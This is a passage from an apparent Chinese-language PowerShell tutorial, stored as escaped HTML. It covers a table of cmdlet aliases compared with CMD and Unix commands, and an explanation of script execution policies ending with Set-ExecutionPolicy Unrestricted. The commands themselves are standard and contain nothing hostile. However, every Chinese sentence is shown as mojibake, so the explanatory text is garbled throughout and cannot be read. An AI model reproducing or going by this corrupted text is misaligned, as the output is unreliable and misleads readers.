&lt;td style=&#34;text-align:center&#34;&gt;åˆ—å‡ºç›®å‰æˆ–æŒ‡å®šæ–‡ä»¶å¤¹ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Test-Connection[&lt;a href=&#34;https://zh.wikipedia.org/wiki/PowerShell#cite_note-8&#34;&gt;a]&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Ping&#34;&gt;ping&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Ping&#34;&gt;ping&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Ping&#34;&gt;ping&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ä»ç›®å‰ç”µè„‘å‘æŒ‡å®šç”µè„‘å‘é€&lt;a href=&#34;https://zh.wikipedia.org/wiki/Ping&#34;&gt;Ping&lt;/a&gt;ï¼Œæˆ–æŒ‡ç¤ºå¦ä¸€å°ç”µè„‘è¿™æ ·åš&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Get-Content&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;gc, type, cat&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=TYPE_(DOS_command)&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;type&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Cat_(Unix)&#34;&gt;cat&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;è·å–æ–‡ä»¶å†…å®¹&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Get-Command&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;gcm&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Help_(command)&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;help&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Type_(Unix)&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;type&lt;/a&gt;, &lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Which_(command)&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;which&lt;/a&gt;, &lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Compgen_(Unix)&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;compgen&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åˆ—å‡ºå¯ç”¨çš„å‘½ä»¤&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Get-Help&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;help, man&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Help_(command)&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;help&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Apropos_(Unix)&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;apropos&lt;/a&gt;, &lt;a href=&#34;https://zh.wikipedia.org/wiki/%E6%89%8B%E5%86%8C%E9%A1%B5&#34;&gt;man&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åœ¨æ§åˆ¶å°ä¸Šæ‰“å°å‘½ä»¤çš„æ–‡æ¡£&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Clear-Host&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;cls, clear&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Cls_(computing)&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;cls&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Clear_(Unix)&#34;&gt;clear&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;æ¸…é™¤å±å¹•[&lt;a href=&#34;https://zh.wikipedia.org/wiki/PowerShell#cite_note-9&#34;&gt;b]&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Copy-Item&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;cpi, copy, cp&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Copy_(%E5%91%BD%E4%BB%A4)&#34;&gt;copy&lt;/a&gt;, &lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Xcopy&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;xcopy&lt;/a&gt;, &lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Robocopy&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;robocopy&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Cp_(Unix)&#34;&gt;cp&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;å°†æ–‡ä»¶å’Œæ–‡ä»¶å¤¹å¤åˆ¶åˆ°å¦ä¸€ä¸ªä½ç½®&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Move-Item&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;mi, move, mv&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Move_(command)&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;move&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Mv_(Unix)&#34;&gt;mv&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;å°†æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ç§»åŠ¨åˆ°æ–°ä½ç½®&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Remove-Item&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ri, del, erase, rmdir, rd, rm&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Del_(command)&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;del&lt;/a&gt;, &lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Del_(command)&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;erase&lt;/a&gt;, &lt;a href=&#34;https://zh.wikipedia.org/wiki/Rmdir&#34;&gt;rmdir&lt;/a&gt;, &lt;a href=&#34;https://zh.wikipedia.org/wiki/Rmdir&#34;&gt;rd&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Rm_(Unix)&#34;&gt;rm&lt;/a&gt;, rmdir&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åˆ é™¤æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Rename-Item&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;rni, ren, mv&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Ren_(command)&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;ren&lt;/a&gt;, rename&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Mv_(Unix)&#34;&gt;mv&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;é‡å‘½åå•ä¸ªæ–‡ä»¶ã€æ–‡ä»¶å¤¹ã€ç¡¬é“¾æ¥æˆ–ç¬¦å·é“¾æ¥&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Get-Location&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;gl, cd, pwd&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Cd_(%E5%91%BD%E4%BB%A4)&#34;&gt;cd&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Pwd&#34;&gt;pwd&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;æ˜¾ç¤ºå·¥ä½œè·¯å¾„ï¼ˆç›®å‰æ–‡ä»¶å¤¹ï¼‰&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Pop-Location&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;popd&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Pushd_and_popd&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;popd&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;popd&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;å°†å·¥ä½œè·¯å¾„æ›´æ”¹ä¸ºæœ€è¿‘æ¨é€åˆ°å †æ ˆä¸Šçš„ä½ç½®&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Push-Location&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;pushd&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Pushd_and_popd&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;pushd&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;pushd&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;å°†å·¥ä½œè·¯å¾„å­˜å‚¨åˆ°å †æ ˆä¸­&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Set-Location&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;sl, cd, chdir&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Cd_(%E5%91%BD%E4%BB%A4)&#34;&gt;cd&lt;/a&gt;, &lt;a href=&#34;https://zh.wikipedia.org/wiki/Cd_(%E5%91%BD%E4%BB%A4)&#34;&gt;chdir&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;cd&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;æ”¹å˜å·¥ä½œè·¯å¾„&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Tee-Object&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;tee&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ä¸é€‚ç”¨&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Tee&#34;&gt;tee&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;å°†è¾“å…¥ç®¡é“ä¼ è¾“åˆ°æ–‡ä»¶æˆ–å˜é‡ï¼Œå¹¶æ²¿ç®¡é“ä¼ é€’è¾“å…¥&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Write-Output&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;echo, write&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Echo_(%E5%91%BD%E4%BB%A4)&#34;&gt;echo&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;echo&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;å°†å­—ç¬¦ä¸²æˆ–å…¶ä»–å¯¹åƒæ‰“å°åˆ°&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E6%A8%99%E6%BA%96%E4%B8%B2%E6%B5%81&#34;&gt;æ ‡å‡†æµ&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Get-Process&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;gps, ps&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;tlist,[&lt;a href=&#34;https://zh.wikipedia.org/wiki/PowerShell#cite_note-Available_tlist_kill-10&#34;&gt;c]&lt;/a&gt; &lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Tasklist&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;tasklist&lt;/a&gt;[&lt;a href=&#34;https://zh.wikipedia.org/wiki/PowerShell#cite_note-Available_tasklist_taskkill-11&#34;&gt;d]&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Ps_(Unix)&#34;&gt;ps&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åˆ—å‡ºæ‰€æœ‰æ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Stop-Process&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;spps, kill&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Kill_(command)&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;kill&lt;/a&gt;,[&lt;a href=&#34;https://zh.wikipedia.org/wiki/PowerShell#cite_note-Available_tlist_kill-10&#34;&gt;c]&lt;/a&gt; &lt;a href=&#34;https://zh.wikipedia.org/wiki/Kill_(%E5%91%BD%E4%BB%A4)&#34;&gt;taskkill&lt;/a&gt;[&lt;a href=&#34;https://zh.wikipedia.org/wiki/PowerShell#cite_note-Available_tasklist_taskkill-11&#34;&gt;d]&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;kill[&lt;a href=&#34;https://zh.wikipedia.org/wiki/PowerShell#cite_note-UNIX_kill_misnomer-12&#34;&gt;e]&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åœæ­¢æ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Select-String&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;sls&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Findstr&#34;&gt;findstr&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Find&#34;&gt;find&lt;/a&gt;, &lt;a href=&#34;https://zh.wikipedia.org/wiki/Grep&#34;&gt;grep&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;æ‰“å°ä¸æ¨¡å¼åŒ¹é…çš„è¡Œ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Set-Variable&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;sv, set&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/w/index.php?title=Environment_variable&amp;amp;action=edit&amp;amp;redlink=1&#34;&gt;set&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;env, export, set, setenv&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;åˆ›å»ºæˆ–æ›´æ”¹&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&#34;&gt;ç¯å¢ƒå˜é‡&lt;/a&gt;çš„å†…å®¹&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Invoke-WebRequest&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;iwr, curl, wget[&lt;a href=&#34;https://zh.wikipedia.org/wiki/PowerShell#cite_note-13&#34;&gt;f]&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/CURL&#34;&gt;curl&lt;/a&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/Wget&#34;&gt;wget&lt;/a&gt;, curl&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;è·å–äº’è”ç½‘ä¸Šçš„ç½‘é¡µå†…å®¹&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;powershellçš„æ‰§è¡Œç­–ç•¥&#34;&gt;Powershellçš„æ‰§è¡Œç­–ç•¥&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬æ¥å°è¯•å†™å…¥å¹¶æ‰§è¡Œä¸€ä¸ªè„šæœ¬ï¼Œæ‰“å¼€powershellçš„å‘½ä»¤è¡Œï¼Œè¾“å…¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#34;Hello,Powershell Script&amp;#34;&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸€èˆ¬æƒ…å†µä¸‹ä¼šå‡ºç°ä»¥ä¸‹çš„é”™è¯¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.\Script.ps1 : æ— æ³•åŠ è½½æ–‡ä»¶ E:\\Script.ps1ï¼Œå› ä¸ºåœ¨æ­¤ç³»ç»Ÿä¸Šç¦æ­¢è¿è¡Œè„šæœ¬ã€‚æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å‚é˜… http://go.microsoft.com/fwlink/?LinkID=135170 ä¸­çš„ about_Execution_Policiesã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æ‰€åœ¨ä½ç½® è¡Œ:1 å­—ç¬¦: 1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+ .\Script.ps1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+ ~~~~~~~~~~~~~~
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    + CategoryInfo          : SecurityError: (:) []ï¼ŒPSSecurityException
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    + FullyQualifiedErrorId : UnauthorizedAccess
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™ä¸ªæ˜¯å› ä¸ºPowerShellæœ¬èº«é™åˆ¶äº†æˆ‘ä»¬è„šæœ¬çš„æ‰§è¡Œï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹å½“å‰çš„æ‰§è¡Œç­–ç•¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Get-ExecutionPolicy&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;PowerShell æä¾›äº† Restrictedã€AllSignedã€RemoteSignedã€Unrestrictedã€Bypassã€Undefined å…­ç§ç±»å‹çš„æ‰§è¡Œç­–ç•¥ ç®€å•ä»‹ç»å„ç§ç­–ç•¥å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;åç§°&lt;/th&gt;
&lt;th&gt;è¯´æ˜&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Restricted&lt;/td&gt;
&lt;td&gt;å—é™åˆ¶çš„ï¼Œå¯ä»¥æ‰§è¡Œå•ä¸ªçš„å‘½ä»¤ï¼Œä½†æ˜¯ä¸èƒ½æ‰§è¡Œè„šæœ¬Windows 8, Windows Server 2012, and Windows 8.1ä¸­é»˜è®¤å°±æ˜¯è¿™ç§ç­–ç•¥ï¼Œæ‰€ä»¥æ˜¯ä¸èƒ½æ‰§è¡Œè„šæœ¬çš„ï¼Œæ‰§è¡Œå°±ä¼šæŠ¥é”™ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;AllSigned&lt;/td&gt;
&lt;td&gt;AllSigned æ‰§è¡Œç­–ç•¥å…è®¸æ‰§è¡Œæ‰€æœ‰å…·æœ‰æ•°å­—ç­¾åçš„è„šæœ¬&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RemoteSigned&lt;/td&gt;
&lt;td&gt;å½“æ‰§è¡Œä»ç½‘ç»œä¸Šä¸‹è½½çš„è„šæœ¬æ—¶ï¼Œéœ€è¦è„šæœ¬å…·æœ‰æ•°å­—ç­¾åï¼Œå¦åˆ™ä¸ä¼šè¿è¡Œè¿™ä¸ªè„šæœ¬ã€‚å¦‚æœæ˜¯åœ¨æœ¬åœ°åˆ›å»ºçš„è„šæœ¬åˆ™å¯ä»¥ç›´æ¥æ‰§è¡Œï¼Œä¸è¦æ±‚è„šæœ¬å…·æœ‰æ•°å­—ç­¾åã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Unrestricted&lt;/td&gt;
&lt;td&gt;è¿™æ˜¯ä¸€ç§æ¯”è¾ƒå®½å®¹çš„ç­–ç•¥ï¼Œå…è®¸è¿è¡Œæœªç­¾åçš„è„šæœ¬ã€‚å¯¹äºä»ç½‘ç»œä¸Šä¸‹è½½çš„è„šæœ¬ï¼Œåœ¨è¿è¡Œå‰ä¼šè¿›è¡Œå®‰å…¨æ€§æç¤ºã€‚éœ€è¦ä½ ç¡®è®¤æ˜¯å¦æ‰§è¡Œè„šæœ¬&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Bypass&lt;/td&gt;
&lt;td&gt;Bypass æ‰§è¡Œç­–ç•¥å¯¹è„šæœ¬çš„æ‰§è¡Œä¸è®¾ä»»ä½•çš„é™åˆ¶ï¼Œä»»ä½•è„šæœ¬éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¹¶ä¸”ä¸ä¼šæœ‰å®‰å…¨æ€§æç¤ºã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Undefined&lt;/td&gt;
&lt;td&gt;Undefined è¡¨ç¤ºæ²¡æœ‰è®¾ç½®è„šæœ¬ç­–ç•¥ã€‚å½“ç„¶æ­¤æ—¶ä¼šå‘ç”Ÿç»§æ‰¿æˆ–åº”ç”¨é»˜è®¤çš„è„šæœ¬ç­–ç•¥ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;ä¸€èˆ¬æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥ä¿®æ”¹è„šæœ¬çš„æ‰§è¡Œç­–ç•¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Set-ExecutionPolicy&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;UnRestricted&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æç¤ºæ˜¯å¦æ›´æ”¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;æ‰§è¡Œç­–ç•¥æ›´æ”¹&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;æ‰§è¡Œç­–ç•¥å¯ä»¥é˜²æ­¢æ‚¨æ‰§è¡Œä¸ä¿¡ä»»çš„è„šæœ¬&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;ã€‚&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;æ›´æ”¹æ‰§è¡Œç­–ç•¥å¯èƒ½ä¼šä½¿æ‚¨é¢ä¸´&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;about_Execution_Policies&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;å¸®åŠ©ä¸»é¢˜ä¸­æ‰€è¿°çš„å®‰å…¨é£é™©&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;ã€‚&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;æ˜¯å¦è¦æ›´æ”¹æ‰§è¡Œç­–ç•¥&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;?&lt;/span&gt;
